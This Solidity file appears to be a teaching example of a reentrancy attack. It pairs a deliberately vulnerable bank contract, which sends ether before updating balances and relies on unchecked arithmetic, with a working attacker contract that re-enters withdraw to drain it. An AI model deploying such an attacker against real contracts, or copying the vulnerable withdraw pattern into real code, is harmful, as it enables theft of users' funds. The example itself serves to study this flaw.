// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/console.sol";

contract VulnerableBank {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() public payable {
        // Increase balance
        balances[msg.sender] += msg.value;
        // Emit log
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // VULNERABILITY: External call before state update
        (bool success,) = msg.sender.call{ value: _amount }("");
        require(success, "Transfer failed");
        // Decrease balance (silent underflow!!!)
        balances[msg.sender] -= _amount;
        // Emit log
        emit Withdrawal(msg.sender, _amount);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() external payable {
        require(msg.value == ATTACK_AMOUNT);
        bank.deposit{ value: ATTACK_AMOUNT }();
        bank.withdraw(ATTACK_AMOUNT);
    }

    receive() external payable {
        if (address(bank).balance >= ATTACK_AMOUNT) {
            bank.withdraw(ATTACK_AMOUNT);
        }
    }
}
